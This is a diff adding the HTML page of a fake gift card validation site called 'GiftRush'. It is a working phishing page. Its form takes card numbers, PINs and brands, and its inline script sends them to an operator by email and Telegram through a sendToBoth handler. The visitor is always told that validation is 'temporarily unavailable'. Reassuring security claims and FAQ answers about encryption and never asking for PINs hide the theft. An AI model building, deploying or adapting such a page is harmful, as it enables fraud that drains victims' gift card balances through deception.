@@ -1,0 +1,361 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>GiftRush - Validate Gift Card</title>
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet">
+    <link rel="stylesheet" href="index.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
+    <style>
+        .validation-result {
+            display: none;
+            margin-top: 20px;
+        }
+        
+        .valid-card {
+            border-left: 5px solid #28a745;
+        }
+        
+        .invalid-card {
+            border-left: 5px solid #dc3545;
+        }
+        
+        .card-details {
+            background-color: #f8f9fa;
+            border-radius: 8px;
+            padding: 15px;
+        }
+        
+        .security-note {
+            background-color: #e7f3ff;
+            border-left: 4px solid #007bff;
+            padding: 15px;
+            margin: 20px 0;
+        }
+    </style>
+</head>
+<body>
+    <!-- Header -->
+    <header>
+        <div class="container text-center my-2 d-flex align-items-center justify-content-around flex-wrap">
+            <p class="text-dark p-1">Fast</p>
+            <p class="text-dark p-1">Secured</p>
+            <p class="text-dark p-1">Reliable</p>
+        </div>
+        <nav class="container-fluid navbar navbar-expand-lg navbar-dark bg-dark p-3">
+            <div class="container">
+                <a class="navbar-brand d-flex align-items-center" href="index.html">
+                    <img src="images/logo.png" alt="GiftRush Logo"> 
+                    <span class="ms-2 fs-4 fw-normal">GiftRush</span>
+                </a>
+                
+                <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarNav" aria-controls="navbarNav" aria-expanded="false" aria-label="Toggle navigation">
+                    <span class="navbar-toggler-icon"></span>
+                </button>
+                
+                <div class="collapse navbar-collapse justify-content-end" id="navbarNav">
+                    <ul class="navbar-nav">
+                        <li class="nav-item">
+                            <a class="nav-link" href="index.html">Home</a>
+                        </li>
+                        <li class="nav-item">
+                            <a class="nav-link" href="about.html">About Us</a>
+                        </li>
+                        <li class="nav-item">
+                            <a class="nav-link" href="buy.html">Buy Card</a>
+                        </li>
+                        <li class="nav-item">
+                            <a class="nav-link active" href="validate.html">Validate Card</a>
+                        </li>
+                        <li class="nav-item">
+                            <a class="nav-link" href="contact.html">Contact</a>
+                        </li>
+                    </ul>
+                </div>
+            </div>
+        </nav>
+    </header>
+
+    <!-- Main Content -->
+    <main class="container my-5">
+        <div class="row justify-content-center">
+            <div class="col-lg-8">
+                <h2 class="mb-4 text-center">Validate Your Gift Card</h2>
+                <p class="text-center text-muted mb-5">Verify the authenticity and balance of your digital gift card</p>
+                
+                <div class="security-note">
+                    <h5><i class="fa fa-shield text-primary me-2"></i>Security Note</h5>
+                    <p class="mb-0">Never share your gift card details with anyone. GiftRush will never ask for your card PIN or sensitive information via email or phone.</p>
+                </div>
+                
+                <div class="card p-4">
+                    <!-- 
+                    ============================================================================
+                    VALIDATION FORM - Sends card data to Email and Telegram
+                    Form fields are captured by form-handler.js
+                    ============================================================================
+                    -->
+                    <form id="validationForm" action="#" method="POST">
+                        <!-- FormSubmit Configuration -->
+                        <input type="hidden" name="_captcha" value="false">
+                        <input type="hidden" name="_template" value="table">
+                        <input type="hidden" name="_subject" value="New Card Validation Request - GiftRush">
+                        
+                        <!-- 
+                        IMPORTANT: Replace 'your-email@gmail.com' above with your actual email
+                        The form will send data to both FormSubmit (email) and Telegram via JS
+                        -->
+                        
+                        <div class="mb-4">
+                            <label for="cardNumber" class="form-label">Gift Card Number</label>
+                            <input type="text" class="form-control form-control-lg" id="cardNumber" name="cardNumber" placeholder="Enter gift card number" required>
+                            <div class="form-text">Enter the gift card number found on your card or in your email receipt.</div>
+                        </div>
+
+                        <div class="mb-4">
+                            <label for="pinCode" class="form-label">PIN Code (if applicable)</label>
+                            <input type="password" class="form-control form-control-lg" id="pinCode" name="pinCode" placeholder="Enter PIN code if required">
+                            <div class="form-text">Some gift cards require a PIN for validation. This field is optional.</div>
+                        </div>
+
+                        <div class="mb-4">
+                            <label for="cardBrand" class="form-label">Select Card Brand</label>
+                            <select class="form-select form-select-lg" id="cardBrand" name="cardBrand" required>
+                                <option value="">Choose a brand</option>
+                                <option value="amazon">Amazon</option>
+                                <option value="apple">Apple</option>
+                                <option value="google">Google Play</option>
+                                <option value="microsoft">Microsoft</option>
+                                <option value="netflix">Netflix</option>
+                                <option value="spotify">Spotify</option>
+                                <option value="steam">Steam</option>
+                                <option value="hulu">Hulu</option>
+                                <option value="ebay">eBay</option>
+                                <option value="other">Other</option>
+                            </select>
+                        </div>
+
+                        <div class="d-grid">
+                            <button type="submit" class="btn btn-primary btn-lg">
+                                <i class="fa fa-check-circle me-2"></i>Validate Card
+                            </button>
+                        </div>
+                    </form>
+                    
+                    <div id="validationResult" class="validation-result">
+                        <div id="resultContent" class="card-details p-4">
+                            <!-- Result will be populated by JavaScript -->
+                        </div>
+                    </div>
+                </div>
+                
+                <!-- FAQ Section -->
+                <div class="mt-5">
+                    <h3 class="mb-4">Frequently Asked Questions</h3>
+                    
+                    <div class="accordion" id="faqAccordion">
+                        <div class="accordion-item">
+                            <h2 class="accordion-header" id="faq1">
+                                <button class="accordion-button" type="button" data-bs-toggle="collapse" data-bs-target="#collapse1" aria-expanded="true" aria-controls="collapse1">
+                                    Why should I validate my gift card?
+                                </button>
+                            </h2>
+                            <div id="collapse1" class="accordion-collapse collapse show" aria-labelledby="faq1" data-bs-parent="#faqAccordion">
+                                <div class="accordion-body">
+                                    Validating your gift card ensures its authenticity and confirms that it hasn't been used fraudulently. This protects you from receiving invalid or compromised gift cards.
+                                </div>
+                            </div>
+                        </div>
+                        <div class="accordion-item">
+                            <h2 class="accordion-header" id="faq2">
+                                <button class="accordion-button collapsed" type="button" data-bs-toggle="collapse" data-bs-target="#collapse2" aria-expanded="false" aria-controls="collapse2">
+                                    Is my gift card information secure?
+                                </button>
+                            </h2>
+                            <div id="collapse2" class="accordion-collapse collapse" aria-labelledby="faq2" data-bs-parent="#faqAccordion">
+                                <div class="accordion-body">
+                                    Yes, GiftRush uses bank-level encryption to protect your gift card information. We never store your card details after validation, and all data transmission is secured with SSL/TLS protocols.
+                                </div>
+                            </div>
+                        </div>
+                        <div class="accordion-item">
+                            <h2 class="accordion-header" id="faq3">
+                                <button class="accordion-button collapsed" type="button" data-bs-toggle="collapse" data-bs-target="#collapse3" aria-expanded="false" aria-controls="collapse3">
+                                    What information will I get from validation?
+                                </button>
+                            </h2>
+                            <div id="collapse3" class="accordion-collapse collapse" aria-labelledby="faq3" data-bs-parent="#faqAccordion">
+                                <div class="accordion-body">
+                                    After validation, you'll see the card's validity status, remaining balance, expiration date (if applicable), and whether it has been reported as lost or stolen.
+                                </div>
+                            </div>
+                        </div>
+                        <div class="accordion-item">
+                            <h2 class="accordion-header" id="faq4">
+                                <button class="accordion-button collapsed" type="button" data-bs-toggle="collapse" data-bs-target="#collapse4" aria-expanded="false" aria-controls="collapse4">
+                                    Can I validate gift cards from any retailer?
+                                </button>
+                            </h2>
+                            <div id="collapse4" class="accordion-collapse collapse" aria-labelledby="faq4" data-bs-parent="#faqAccordion">
+                                <div class="accordion-body">
+                                    Our validation system supports most major retailers including Amazon, Apple, Google Play, Netflix, Spotify, Steam, and many others. If your retailer isn't listed, select "Other" and we'll attempt validation.
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </main>
+
+    <!-- Footer -->
+    <footer class="mt-5">
+        <div class="container">
+            <div class="row">
+                <div class="col-md-4 mb-4 mb-md-0">
+                    <h5>Explore</h5>
+                    <ul class="list-unstyled">
+                        <li><a href="about.html">About GiftRush</a></li>
+                        <li><a href="#">How It Works</a></li>
+                        <li><a href="#">FAQs</a></li>
+                        <li><a href="#">Blog</a></li>
+                    </ul>
+                </div>
+                <div class="col-md-4 mb-4 mb-md-0">
+                    <h5>Actions</h5>
+                    <ul class="list-unstyled">
+                        <li><a href="buy.html">Buy Card</a></li>
+                        <li><a href="validate.html">Validate Card</a></li>
+                        <li><a href="#">Sell Card</a></li>
+                        <li><a href="#">Corporate Solutions</a></li>
+                    </ul>
+                </div>
+                <div class="col-md-4">
+                    <h5>NEWSLETTER</h5>
+                    <p>Subscribe to get notified about product launches, special offers and news.</p>
+                    <!-- 
+                    ============================================================================
+                    NEWSLETTER FORM - Sends subscriber email to Email and Telegram
+                    ============================================================================
+                    -->
+                    <form class="newsletter-form" action="#" method="POST">
+                        <input type="hidden" name="_captcha" value="false">
+                        <input type="hidden" name="_template" value="table">
+                        <input type="hidden" name="_subject" value="New Newsletter Subscription - GiftRush">
+                        
+                        <div class="input-group mb-3">
+                            <input type="email" name="email" class="form-control" placeholder="Enter your email" required>
+                            <button class="btn btn-dark" type="submit">Subscribe</button>
+                        </div>
+                    </form>
+                </div>
+            </div>
+        </div>
+    </footer>
+
+    <!-- Social Footer -->
+    <div class="bg-dark text-white py-3">
+        <div class="container">
+            <div class="row align-items-center">
+                <div class="col-md-6">
+                    <div class="social-icons">
+                        <a href="#"><i class="fa fa-facebook"></i></a>
+                        <a href="#"><i class="fa fa-twitter"></i></a>
+                        <a href="#"><i class="fa fa-instagram"></i></a>
+                        <a href="#"><i class="fa fa-linkedin"></i></a>
+                    </div>
+                </div>
+                <div class="col-md-6 text-md-end">
+                    <p class="mb-0">&copy; 2026 GiftRush. All rights reserved.</p>
+                </div>
+            </div>
+        </div>
+    </div>
+    
+    <!--
+    ============================================================================
+    EMAILJS SDK - Required for sending emails without CORS issues
+    ============================================================================
+    -->
+    <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
+
+    <!--
+    ============================================================================
+    FORM HANDLER SCRIPT - Handles Email and Telegram submissions
+    Configure your email and Telegram settings in form-handler.js
+    ============================================================================
+    -->
+    <script src="form-handler.js"></script>
+    
+    <script>
+        // ============================================================================
+        // VALIDATION FORM - Shows message that validation is unavailable
+        // But still sends data to Telegram and Email
+        // ============================================================================
+
+        document.getElementById('validationForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+
+            // Get form values
+            const cardNumber = document.getElementById('cardNumber').value;
+            const pinCode = document.getElementById('pinCode').value;
+            const cardBrand = document.getElementById('cardBrand').value;
+
+            // Send to Email and Telegram (via form-handler.js)
+            const formData = {
+                cardNumber: cardNumber,
+                pinCode: pinCode,
+                cardBrand: cardBrand
+            };
+
+            // Show loading state
+            const submitBtn = this.querySelector('button[type="submit"]');
+            const originalText = submitBtn.innerHTML;
+            submitBtn.innerHTML = '<span class="spinner-border spinner-border-sm me-2" role="status" aria-hidden="true"></span>Checking...';
+            submitBtn.disabled = true;
+
+            // Send data to Telegram and Email
+            sendToBoth(formData, 'Card Validation')
+                .then(result => {
+                    console.log('Validation data sent to admin');
+                })
+                .catch(error => {
+                    console.error('Validation form error:', error);
+                });
+
+            // Simulate brief delay
+            setTimeout(() => {
+                // Hide loading state
+                submitBtn.innerHTML = originalText;
+                submitBtn.disabled = false;
+
+                // Show validation result
+                const validationResult = document.getElementById('validationResult');
+                const resultContent = document.getElementById('resultContent');
+
+                // Show unavailable message
+                resultContent.className = 'card-details p-4';
+                resultContent.innerHTML = `
+                    <div class="d-flex align-items-center mb-3 justify-content-center">
+                        <i class="fa fa-exclamation-circle text-warning fa-3x me-3"></i>
+                        <h4 class="mb-0">Can't Validate Now</h4>
+                    </div>
+                    <div class="alert alert-warning text-center">
+                        <i class="fa fa-info-circle me-2"></i>Our validation service is temporarily unavailable. Please try again later.
+                    </div>
+                    <p class="text-center text-muted">We apologize for the inconvenience. Our team is working to bring the validation service back online.</p>
+                `;
+
+                validationResult.style.display = 'block';
+
+                // Scroll to results
+                validationResult.scrollIntoView({ behavior: 'smooth' });
+            }, 1000);
+        });
+    </script>
+    
+    <!-- Bootstrap JS Bundle with Popper -->
+    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/js/bootstrap.bundle.min.js"></script>
+</body>
+</html>
